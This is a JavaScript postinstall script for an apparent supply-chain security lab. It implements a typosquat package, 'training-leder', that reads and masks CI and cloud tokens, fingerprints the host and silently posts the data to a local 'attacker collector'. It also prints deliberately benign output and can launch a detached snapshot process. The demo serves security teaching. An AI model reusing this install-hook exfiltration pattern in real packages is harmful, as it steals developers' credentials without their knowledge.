/**
 * LAB ATK1 — local `file:` typosquat demo package.
 *
 * Default **terminal output** is intentionally boring / “legitimate” so a rushed developer
 * does not immediately recognise a lab attack. Full forensic JSON is still written to disk for
 * the course API / SIEM. Instructors: set `LAB_ATK1_VERBOSE=1` before `npm install` to print
 * banners + `__LAB_ATK1_JSON__` blocks on stdout.
 */
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { spawn } from "node:child_process";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";
import os from "node:os";
import { fetchProtectionCheck } from "../_lab/protection-check.mjs";

const __dir = dirname(fileURLToPath(import.meta.url));
const homedir = os.homedir();
const globalDir = join(homedir, ".supply-chain-lab");
const globalReportPath = join(globalDir, "last-atk1-exfil.json");

const legacyDemoSiteReport = join(__dir, "..", "..", "attack-exfil-report.json");
const periodicScript = join(__dir, "periodic-lab-snapshot.mjs");
const periodicPidPath = join(globalDir, "atk1-periodic-demo.pid");

const VERBOSE = process.env.LAB_ATK1_VERBOSE === "1";

const WATCHED_KEYS = [
  "DEMO_SECRET",
  "NPM_TOKEN",
  "NODE_AUTH_TOKEN",
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "CI_JOB_TOKEN",
  "NETLIFY_AUTH_TOKEN",
  "SENTRY_AUTH_TOKEN",
];

function mask(val) {
  if (val == null || val === "") return "(unset)";
  const s = String(val);
  if (s.length <= 8) return `[redacted, ${s.length} chars]`;
  return `${s.slice(0, 4)}…(+${s.length - 8} chars)…${s.slice(-4)}`;
}

function watchedEnvSnapshot() {
  const snap = {};
  for (const k of WATCHED_KEYS) {
    if (process.env[k] !== undefined) snap[k] = mask(process.env[k]);
  }
  return snap;
}

function logBenign(lines) {
  for (const l of lines) console.log(l);
}

function logVerbose(lines) {
  if (!VERBOSE) return;
  for (const l of lines) console.log(l);
}

function notifyInstall() {
  // Terminal notice for the victim (they see a benign-looking line).
  console.log("[training-leder] Running post-install integrity check…");
}

/**
 * Phone-home to the attacker's collector (backend API).
 * Runs silently — any network error is swallowed so the victim never sees it.
 */
function phoneHome(payload) {
  const collectorHost = process.env.LAB_COLLECTOR_HOST || "127.0.0.1";
  const collectorPort = Number(process.env.LAB_COLLECTOR_PORT || "8000");

  const body = JSON.stringify(payload);

  return new Promise((resolve) => {
    try {
      const req = http.request(
        {
          host: collectorHost,
          port: collectorPort,
          path: "/v1/lab/install-alert",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(body),
          },
          timeout: 3000,
        },
        (res) => { res.resume(); res.on("end", resolve); }
      );
      req.on("error", () => resolve());
      req.on("timeout", () => { req.destroy(); resolve(); });
      req.write(body);
      req.end();
    } catch { resolve(); }
  });
}

function buildLiveDemoPayload(report, watched, initCwd) {
  const wr = report.what_operator_would_receive;
  const envLines = Object.keys(watched).length
    ? Object.keys(watched).map((k) => `    ${k} = ${watched[k]}`)
    : ["    (no watched keys — export DEMO_SECRET to demo capture)"];

  const victim_terminal = [
    `> training-leder@1.0.0 postinstall`,
    `> node postinstall.mjs`,
    `[training-leder] Running post-install integrity check…`,
    `[training-leder] Finance Training Helper — verifying workspace integration…`,
    `[training-leder] Locale bundle: using built-in English (offline-safe).`,
    `[training-leder] Post-install checks complete. No further action required.`,
  ];

  const attacker_terminal = [
    "",
    "╔══════════════════════════════════════════════════════╗",
    "║  ATTACKER C2 — TYPOsquat INSTALL BEACON              ║",
    "╚══════════════════════════════════════════════════════╝",
    `[+] Attack    : ATK1 typosquatting (training-leder)`,
    `[+] Package   : training-leder → masquerades as training-ledger`,
    `[+] Hostname  : ${wr.hostname}`,
    `[+] User      : ${wr.username ?? "unknown"}`,
    `[+] Platform  : ${wr.platform}`,
    `[+] CWD       : ${initCwd}`,
    "",
    "[*] Exfiltrated environment (masked):",
    ...envLines,
    "",
    "[✓] RCE postinstall complete — victim saw benign output only.",
  ];

  return {
    status: "allowed",
    package: "training-leder",
    version: "1.0.0",
    attack_type: "typosquatting",
    hostname: wr.hostname,
    username: wr.username,
    platform: wr.platform,
    cwd: initCwd,
    watched_env: watched,
    victim_terminal,
    attacker_terminal,
  };
}

(async () => {
  try {
  const PACKAGE = "training-leder";
  const PACKAGE_VERSION = "1.0.0";
  const protection = await fetchProtectionCheck(PACKAGE, PACKAGE_VERSION);

  if (protection.blocked) {
    const initCwd = process.env.INIT_CWD || process.cwd();
    const hostname = os.hostname();
    let username = null;
    try {
      username = os.userInfo().username;
    } catch {
      /* ignore */
    }

    const victim_terminal = [
      `> ${PACKAGE}@${PACKAGE_VERSION} postinstall`,
      `> node postinstall.mjs`,
      `[supply-chain-security] Blocked malicious install: ${PACKAGE}`,
      `[supply-chain-security] ${protection.reason}`,
    ];
    const attacker_terminal = [
      "",
      "╔══════════════════════════════════════════════════════╗",
      "║  SUPPLY CHAIN PROTECTION — INSTALL BLOCKED           ║",
      "╚══════════════════════════════════════════════════════╝",
      `[!] Package   : ${PACKAGE}`,
      `[!] Attack    : ${protection.attack_type || "supply_chain"}`,
      `[!] Reason    : ${protection.reason}`,
      `[!] Hostname  : ${hostname}`,
      `[!] User      : ${username ?? "unknown"}`,
      `[!] CWD       : ${initCwd}`,
      "",
      "[✓] Exfil postinstall did NOT run — attack stopped at policy gate.",
    ];

    await phoneHome({
      status: "blocked",
      package: PACKAGE,
      version: PACKAGE_VERSION,
      attack_type: protection.attack_type || "typosquatting",
      block_reason: protection.reason,
      engine: protection.engine || null,
      hostname,
      username,
      platform: `${process.platform} ${os.release()}`,
      cwd: initCwd,
      victim_terminal,
      attacker_terminal,
    });

    console.error(`[supply-chain-security] Attack blocked: ${protection.reason}`);
    process.exit(1);
  }

  notifyInstall();
  const watched = watchedEnvSnapshot();
  const initCwd = process.env.INIT_CWD || process.cwd();

  const report = {
    attack_package: "training-leder",
    masquerades_as: "training-ledger",
    disclaimer:
      "Controlled lab artifact. Shows what a malicious postinstall could observe on this machine.",
    timestamp: new Date().toISOString(),
    install_invoked_from: initCwd,
    package_on_disk: __dir,
    backdoors_demonstrated: [
      "npm lifecycle: postinstall runs without user interaction",
      "Full read access to process.env for the installing user/CI job",
      "Host and path fingerprinting (hostname, cwd, OS)",
      "Arbitrary file write as the install user (global report + optional LAB_EXFIL_PATH)",
    ],
    what_operator_would_receive: {
      cwd_during_hook: process.cwd(),
      npm_init_cwd: process.env.INIT_CWD ?? null,
      hostname: os.hostname(),
      platform: `${process.platform} ${os.release()}`,
      username: (() => {
        try {
          return os.userInfo().username;
        } catch {
          return null;
        }
      })(),
      npm_package_name: process.env.npm_package_name ?? null,
      npm_lifecycle_event: process.env.npm_lifecycle_event ?? null,
      npm_config_user_agent: process.env.npm_config_user_agent ?? null,
      watched_sensitive_env: watched,
      path_length_chars: process.env.PATH ? process.env.PATH.length : 0,
    },
    report_files: {
      global_machine_wide: globalReportPath,
      lab_exfil_env: process.env.LAB_EXFIL_PATH || null,
      legacy_demo_site_relative: "demo-site/attack-exfil-report.json (only if written)",
    },
    periodic_lab_demo:
      process.env.LAB_ATK1_PERIODIC_DEMO === "1"
        ? {
            enabled: true,
            interval_ms_default: 30 * 60 * 1000,
            interval_ms_effective:
              Math.max(10_000, Number(process.env.LAB_ATK1_INTERVAL_MS) || 30 * 60 * 1000),
            log_file: join(globalDir, "atk1-periodic-snapshots.jsonl"),
            pid_file: periodicPidPath,
            stop_command: "kill $(cat ~/.supply-chain-lab/atk1-periodic-demo.pid)",
            note: "Detached Node process appends masked snapshots on a timer — lab simulation only.",
          }
        : {
            enabled: false,
            hint: "Set LAB_ATK1_PERIODIC_DEMO=1 (and optionally LAB_ATK1_INTERVAL_MS) before npm install for timed snapshots.",
          },
    industry_defense_alignment: [
      {
        name: "OpenSSF Scorecard",
        url: "https://github.com/ossf/scorecard",
        note: "Automated checks on OSS repos (dangerous workflows, branch protection).",
      },
      {
        name: "SLSA / provenance",
        url: "https://github.com/slsa-framework/slsa",
        note: "Build provenance so consumers can verify where an artifact came from.",
      },
      {
        name: "Sigstore Cosign",
        url: "https://github.com/sigstore/cosign",
        note: "Sign and verify container images / blobs — pairs with provenance.",
      },
      {
        name: "npm install --ignore-scripts",
        url: "https://docs.npmjs.com/cli/v10/commands/npm-install",
        note: "CI can skip lifecycle scripts; combine with allowlists and lockfile review.",
      },
    ],
  };

  mkdirSync(globalDir, { recursive: true });
  writeFileSync(globalReportPath, `${JSON.stringify(report, null, 2)}\n`, "utf8");

  // Phone-home: silently alert the attacker dashboard (dual-terminal live demo).
  phoneHome(buildLiveDemoPayload(report, watched, initCwd)).catch(() => {});

  if (process.env.LAB_EXFIL_PATH) {
    const extra = process.env.LAB_EXFIL_PATH;
    mkdirSync(dirname(extra), { recursive: true });
    writeFileSync(extra, `${JSON.stringify(report, null, 2)}\n`, "utf8");
  }

  try {
    writeFileSync(legacyDemoSiteReport, `${JSON.stringify(report, null, 2)}\n`, "utf8");
  } catch {
    /* not under demo-site tree */
  }

  if (process.env.LAB_ATK1_PERIODIC_DEMO === "1") {
    try {
      try {
        const old = readFileSync(periodicPidPath, "utf8").trim();
        const pid = Number(old);
        if (pid > 0) {
          try {
            process.kill(pid, "SIGTERM");
          } catch {
            /* stale pid */
          }
        }
      } catch {
        /* no previous pid */
      }
      const child = spawn(process.execPath, [periodicScript], {
        detached: true,
        stdio: "ignore",
        env: { ...process.env, LAB_ATK1_PERIODIC_DEMO: "1" },
        cwd: homedir,
      });
      child.unref();
    } catch (e) {
      if (VERBOSE) {
        console.error("[LAB ATK1] periodic demo spawn failed (non-fatal):", e?.message ?? e);
      } else {
        console.log("[training-leder] Optional background sync unavailable (skipped).");
      }
    }
  }

  /* ── What the developer sees by default (looks like a normal helper package) ── */
  logBenign([
    "[training-leder] Finance Training Helper — verifying workspace integration…",
    "[training-leder] Locale bundle: using built-in English (offline-safe).",
    "[training-leder] Post-install checks complete. No further action required.",
  ]);

  /* ── Instructor / SIEM pipeline: explicit forensic banner + JSON on stdout ── */
  if (VERBOSE) {
    logVerbose([
      "",
      "╔════════════════════════════════════════════════════════════════════╗",
      "║  LAB ATK1 — verbose forensic mode (LAB_ATK1_VERBOSE=1)            ║",
      "╚════════════════════════════════════════════════════════════════════╝",
      `  → Forensic JSON: ${globalReportPath}`,
      `  → npm INIT_CWD: ${initCwd}`,
      process.env.LAB_EXFIL_PATH ? `  → LAB_EXFIL_PATH: ${process.env.LAB_EXFIL_PATH}` : "",
      `  → Watched env keys (masked): ${Object.keys(watched).length ? Object.keys(watched).join(", ") : "(none)"}`,
      process.env.LAB_ATK1_PERIODIC_DEMO === "1"
        ? "  → Periodic demo: ~/.supply-chain-lab/atk1-periodic-snapshots.jsonl"
        : "",
      "  → Machine-parseable block follows (__LAB_ATK1_JSON__ … __LAB_ATK1_JSON_END__)",
      "",
    ].filter(Boolean));
    console.log("__LAB_ATK1_JSON__");
    console.log(JSON.stringify(report, null, 2));
    console.log("__LAB_ATK1_JSON_END__");
  }
  } catch (err) {
    if (VERBOSE) {
      console.error("[LAB ATK1] postinstall error (non-fatal):", err?.message ?? err);
    } else {
      console.log(`[training-leder] Post-install notice: ${err?.message ?? err} (non-fatal).`);
    }
  }
})();
